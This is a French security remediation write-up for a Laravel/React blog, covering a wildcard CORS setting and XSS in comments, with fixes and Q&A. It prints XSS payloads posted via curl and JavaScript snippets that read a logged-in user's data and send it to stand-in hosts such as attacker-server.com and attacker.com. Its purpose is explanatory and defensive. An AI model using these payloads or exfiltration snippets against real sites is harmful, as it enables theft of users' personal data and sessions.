# [SEC-003] CORS ouvert à tous + XSS dans les commentaires

## 🔍 Problèmes identifiés

### Vulnérabilité 1 : CORS ouvert à tous (`config/cors.php`)
```php
'allowed_origins' => ['*'],  // ❌ Permet n'importe quel domaine
```

### Vulnérabilité 2 : XSS dans les commentaires (`CommentList.jsx`)
```jsx
<div 
  dangerouslySetInnerHTML={{ __html: comment.content }}  // ❌ Exécute du JS
  style={{ marginBottom: '0.5rem' }}
/>
```

## ✅ Solutions implémentées

### 1. CORS sécurisé (`config/cors.php`)
```php
'allowed_origins' => [
    'http://localhost:3000',      // Dev frontend
    'http://localhost:8000',      // Dev backend
    env('FRONTEND_URL', 'https://votredomaine.com'),  // Production
],
```

### 2. Protection XSS (`CommentList.jsx`)
```jsx
{/* AVANT - Vulnérable */}
<div dangerouslySetInnerHTML={{ __html: comment.content }} />

{/* APRÈS - Sécurisé */}
<div style={{ marginBottom: '0.5rem' }}>
  {comment.content}  {/* React échappe automatiquement */}
</div>
```

## 📋 Réponses aux questions

### Q1 : Comment as-tu testé la vulnérabilité XSS de manière sécurisée ?

#### Méthode de test XSS sécurisée

**Environnement de test contrôlé** :
- ✅ Tests en local (localhost)
- ✅ Base de données de développement
- ✅ Pas de données réelles d'utilisateurs
- ✅ Navigation privée pour isoler les tests

#### Payloads XSS testés

**1. Test basique - Alert**
```bash
curl -X POST http://localhost:8000/api/comments \
  -H "Content-Type: application/json" \
  -d '{
    "article_id": 1,
    "user_id": 1,
    "content": "<script>alert(\"XSS Test\")</script>"
  }'
```
**Résultat avec dangerouslySetInnerHTML** :
- ❌ Alert s'affiche
- ❌ Script exécuté dans le navigateur

**Résultat après correction** :
- ✅ Texte affiché : `<script>alert("XSS Test")</script>`
- ✅ Pas d'exécution de code

**2. Test avec événement onerror**
```bash
curl -X POST http://localhost:8000/api/comments \
  -H "Content-Type: application/json" \
  -d '{
    "article_id": 1,
    "user_id": 1,
    "content": "<img src=x onerror=\"alert(\"Hacked!\")\"/>"
  }'
```
**Résultat avec dangerouslySetInnerHTML** :
- ❌ Image invisible se charge
- ❌ onerror se déclenche
- ❌ Alert s'affiche

**3. Test de redirection malveillante**
```bash
curl -X POST http://localhost:8000/api/comments \
  -H "Content-Type: application/json" \
  -d '{
    "article_id": 1,
    "user_id": 1,
    "content": "<img src=x onerror=\"setTimeout(() => window.location.href=\\\"https://malicious-site.com\\\", 2000)\">"
  }'
```
**Impact si non corrigé** :
- ❌ Redirection automatique après 2 secondes
- ❌ Phishing possible
- ❌ Vol de session possible

#### Outils de vérification

**1. DevTools Console**
```javascript
// Vérifier si le script s'est exécuté
console.log("XSS test executed!");
```

**2. React DevTools**
- Inspecter le DOM pour voir si HTML est parsé ou échappé
- Vérifier les props du composant

**3. Burp Suite / OWASP ZAP (optionnel)**
- Scanner automatique de vulnérabilités XSS
- Tests d'injection plus sophistiqués

#### Nettoyage après tests

```sql
-- Supprimer les commentaires de test
DELETE FROM comments WHERE content LIKE '%<script>%';
DELETE FROM comments WHERE content LIKE '%onerror%';
```

**Bonne pratique** :
- ✅ Tester sur un article dédié "Test XSS"
- ✅ Documenter les payloads testés
- ✅ Ne jamais tester sur un environnement de production
- ✅ Supprimer les données de test après vérification

---

### Q2 : Pourquoi `dangerouslySetInnerHTML` est-il problématique et quelle est l'alternative ?

#### Pourquoi c'est dangereux

**1. Exécute du JavaScript arbitraire**
```jsx
// ❌ DANGEREUX
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// Si userInput = "<script>alert('XSS')</script>"
// → Le script s'exécute !
```

**2. Contourne la protection React**
React échappe automatiquement le contenu :
```jsx
// ✅ SÉCURISÉ (comportement par défaut de React)
<div>{userInput}</div>
// Si userInput = "<script>alert('XSS')</script>"
// → Affiche le texte littéralement, ne l'exécute PAS
```

**3. Permet tous les vecteurs d'attaque XSS**
- ✅ `<script>` tags
- ✅ Event handlers : `onerror`, `onload`, `onclick`
- ✅ `javascript:` URLs
- ✅ Attributs `style` avec `expression()`
- ✅ Iframes malveillants
- ✅ Balises `<object>`, `<embed>`

#### Alternatives sécurisées

**Alternative 1 : Utiliser React par défaut (RECOMMANDÉ)**
```jsx
// ✅ MEILLEUR : React échappe automatiquement
function CommentDisplay({ comment }) {
  return (
    <div>
      {comment.content}  {/* Échappé automatiquement */}
    </div>
  );
}
```

**Alternative 2 : Librairie de sanitization (si HTML nécessaire)**
```jsx
import DOMPurify from 'dompurify';

function CommentDisplay({ comment }) {
  // Si on DOIT autoriser certains tags HTML (gras, italique, etc.)
  const cleanHTML = DOMPurify.sanitize(comment.content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: []  // Pas d'attributs = pas d'événements
  });
  
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
```

**Alternative 3 : Markdown (encore mieux)**
```jsx
import ReactMarkdown from 'react-markdown';

function CommentDisplay({ comment }) {
  // Les utilisateurs écrivent en Markdown
  // ReactMarkdown convertit en HTML sûr
  return <ReactMarkdown>{comment.content}</ReactMarkdown>;
}
```

#### Comparaison

| Approche | Sécurité | Flexibilité | Complexité |
|----------|---------|-------------|------------|
| React par défaut | ✅✅✅ | ❌ (texte seulement) | ✅ Simple |
| DOMPurify | ✅✅ | ✅ (HTML limité) | ⚠️ Moyen |
| Markdown | ✅✅✅ | ✅✅ (formatage riche) | ⚠️ Moyen |
| dangerouslySetInnerHTML | ❌❌❌ | ✅✅✅ (tout HTML) | ✅ Simple |

**Quand utiliser `dangerouslySetInnerHTML` ?**
- ✅ HTML généré par le serveur (contrôlé)
- ✅ Contenu déjà sanitizé côté backend
- ✅ CMS avec éditeur WYSIWYG (avec sanitization)
- ❌ **JAMAIS** avec du contenu utilisateur brut

**Le nom dit tout** : "_dangerously_" → React vous avertit que c'est risqué !

---

### Q3 : Pour le CORS, quels sont les risques concrets de laisser `'*'` en production ?

#### Risques concrets avec `'allowed_origins' => ['*']`

**1. Attaque CSRF (Cross-Site Request Forgery)**

**Scénario** :
1. Utilisateur connecté à votre blog (session active)
2. Visite un site malveillant : `https://malicious-site.com`
3. Le site malveillant exécute :
```javascript
// malicious-site.com
fetch('https://votre-api.com/api/articles/1', {
  method: 'DELETE',
  credentials: 'include'  // Envoie les cookies de session
});
```
4. ❌ L'article est supprimé car la requête vient d'un utilisateur authentifié
5. ❌ CORS `*` autorise la requête depuis n'importe quel domaine

**Impact** : Modification/suppression de données au nom de l'utilisateur

**2. Vol de données sensibles**

```javascript
// malicious-site.com
fetch('https://votre-api.com/api/users/me', {
  credentials: 'include'
})
  .then(res => res.json())
  .then(data => {
    // ❌ Le site malveillant récupère les données de l'utilisateur
    fetch('https://attacker-server.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)  // Email, nom, etc.
    });
  });
```

**Impact** : Fuite de données personnelles (RGPD violation)

**3. Attaque par rebond (Proxy malveillant)**

Un site malveillant peut utiliser votre API comme proxy :
```javascript
// Le site malveillant utilise votre API pour scanner des réseaux internes
fetch('https://votre-api.com/api/proxy?url=http://192.168.1.1/admin');
```

**4. Rate limiting contourné**

```javascript
// Un bot peut faire des milliers de requêtes depuis différents domaines
for (let i = 0; i < 10000; i++) {
  fetch('https://votre-api.com/api/articles', {
    headers: { 'Origin': 'https://fake-domain-' + i + '.com' }
  });
}
```
❌ CORS `*` accepte toutes les origines → Rate limiting moins efficace

**5. Scénario réel : Exfiltration de commentaires privés**

```javascript
// Sur un forum public (https://forum-public.com)
setInterval(() => {
  fetch('https://votre-api.com/api/comments', {
    credentials: 'include'
  })
    .then(res => res.json())
    .then(comments => {
      // ❌ Exfiltre les commentaires vers un serveur attaquant
      fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(comments)
      });
    });
}, 5000);
```

#### Différence avec CORS sécurisé

**Avec `'*'` (Vulnérable)** :
```
Browser → https://malicious-site.com
         ↓ (fait requête vers)
      https://votre-api.com
         ↓ (répond avec)
      Access-Control-Allow-Origin: *
         ↓ (autorise)
      ✅ Requête acceptée, données envoyées au site malveillant
```

**Avec domaines autorisés (Sécurisé)** :
```
Browser → https://malicious-site.com
         ↓ (fait requête vers)
      https://votre-api.com
         ↓ (vérifie Origin header)
      malicious-site.com ≠ localhost:3000 || votredomaine.com
         ↓ (refuse)
      ❌ CORS error, requête bloquée par le navigateur
```

#### Cas d'usage légitime de `'*'`

**Quand c'est acceptable** :
- ✅ API publique en lecture seule (météo, actualités, etc.)
- ✅ Pas d'authentification
- ✅ Pas de données sensibles
- ✅ Pas de modification d'état

**Exemple** :
```php
// OK pour une API publique de citations
'allowed_origins' => ['*'],  // Tout le monde peut lire les citations
```

**Mais même dans ce cas, mieux vaut limiter** :
```php
'allowed_origins' => [
    'https://*.votresite.com',  // Tous vos sous-domaines
    'https://partenaire-autorise.com',
],
```

#### Recommandations

**Développement** :
```php
'allowed_origins' => [
    'http://localhost:3000',
    'http://localhost:8000',
    'http://127.0.0.1:3000',
],
```

**Production** :
```php
'allowed_origins' => [
    env('FRONTEND_URL', 'https://votredomaine.com'),
    'https://www.votredomaine.com',
    'https://app.votredomaine.com',
],
```

**Avec wildcards (Laravel 9+)** :
```php
'allowed_origins_patterns' => [
    '/^https:\/\/.*\.votredomaine\.com$/',  // Tous les sous-domaines
],
```

---

### Q4 : Faut-il corriger côté backend, frontend, ou les deux ?

#### Réponse courte : **LES DEUX** (défense en profondeur)

#### Partie 1 : CORS

**Backend OBLIGATOIRE ✅**
```php
// config/cors.php
'allowed_origins' => [
    'http://localhost:3000',
    env('FRONTEND_URL', 'https://votredomaine.com'),
],
```
**Pourquoi backend ?**
- ✅ Le serveur envoie les headers CORS
- ✅ Le navigateur vérifie ces headers
- ✅ Seule vraie protection

**Frontend inutile ❌**
- Le frontend ne peut PAS contrôler CORS
- CORS est géré par le navigateur, pas par le code JS

#### Partie 2 : XSS

**Frontend OBLIGATOIRE ✅**
```jsx
// CommentList.jsx
<div>{comment.content}</div>  // Au lieu de dangerouslySetInnerHTML
```
**Pourquoi frontend ?**
- ✅ Dernière ligne de défense avant affichage
- ✅ React échappe automatiquement
- ✅ Protection immédiate

**Backend RECOMMANDÉ ✅ (défense en profondeur)**
```php
// CommentController.php
public function store(Request $request)
{
    $validated = $request->validate([
        'content' => 'required|string',
    ]);
    
    // Sanitize côté serveur aussi
    $cleanContent = strip_tags($validated['content']);
    // Ou avec HTMLPurifier pour autoriser certains tags
    
    $comment = Comment::create([
        'content' => $cleanContent,
        // ...
    ]);
}
```

**Pourquoi backend aussi ?**
- ✅ Protection si le frontend est contourné (API directe)
- ✅ Données propres en base de données
- ✅ Protection pour d'autres clients (mobile, etc.)

#### Stratégie de défense en profondeur

**Niveau 1 : Validation backend** (1ère barrière)
```php
$request->validate([
    'content' => 'required|string|max:1000',
]);
```

**Niveau 2 : Sanitization backend** (2ème barrière)
```php
use HTMLPurifier;

$config = HTMLPurifier_Config::createDefault();
$config->set('HTML.Allowed', 'p,b,i,em,strong,br');
$purifier = new HTMLPurifier($config);
$cleanContent = $purifier->purify($validated['content']);
```

**Niveau 3 : Échappement frontend** (3ème barrière)
```jsx
// React échappe automatiquement
<div>{comment.content}</div>
```

**Niveau 4 : CSP headers** (4ème barrière)
```php
// Dans middleware ou .htaccess
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

#### Tableau récapitulatif

| Vulnérabilité | Backend | Frontend | CSP | Meilleure pratique |
|---------------|---------|----------|-----|-------------------|
| **CORS** | ✅ Obligatoire | ❌ Impossible | ❌ | Backend uniquement |
| **XSS** | ✅ Recommandé | ✅ Obligatoire | ✅ Bonus | Les 3 idéalement |

#### Exemple complet

**Backend (Laravel)** :
```php
// config/cors.php
'allowed_origins' => ['http://localhost:3000'],

// CommentController.php
public function store(Request $request)
{
    $validated = $request->validate([
        'content' => 'required|string|max:1000',
    ]);
    
    // Sanitize
    $cleanContent = strip_tags($validated['content'], '<p><b><i><em><strong><br>');
    
    Comment::create([
        'content' => $cleanContent,
        'user_id' => $request->user_id,
        'article_id' => $request->article_id,
    ]);
}
```

**Frontend (React)** :
```jsx
// CommentList.jsx
function CommentDisplay({ comment }) {
  return (
    <div className="comment">
      {/* React échappe automatiquement */}
      <div>{comment.content}</div>
      <small>— {comment.user?.name}</small>
    </div>
  );
}
```

**Pourquoi les deux ?**
- ✅ Si un attaquant contourne le frontend → backend protège
- ✅ Si backend oublie de sanitize → frontend protège
- ✅ Conformité aux standards de sécurité (OWASP)
- ✅ Audit de sécurité réussi

**Principe de sécurité** : "Never trust user input, validate everywhere"

## 🧪 Tests effectués

### Test CORS
```bash
# Test depuis un domaine non autorisé
curl -H "Origin: https://malicious-site.com" \
     -H "Access-Control-Request-Method: GET" \
     -H "Access-Control-Request-Headers: X-Requested-With" \
     -X OPTIONS http://localhost:8000/api/articles

# Résultat attendu : Pas de header Access-Control-Allow-Origin
```

### Test XSS
```bash
# Créer un commentaire avec script
curl -X POST http://localhost:8000/api/comments \
  -H "Content-Type: application/json" \
  -d '{"article_id": 1, "user_id": 1, "content": "<script>alert(\"XSS\")</script>"}'

# Vérifier dans le navigateur :
# - AVANT correction : Alert s'affiche
# - APRÈS correction : Texte littéral affiché
```

## 🛡️ Résumé des protections

✅ **CORS** : Limité aux domaines autorisés (localhost + production)  
✅ **XSS** : Suppression de `dangerouslySetInnerHTML`  
✅ **Sanitization backend** : `strip_tags()` optionnel  
✅ **Défense en profondeur** : Protection aux 2 niveaux
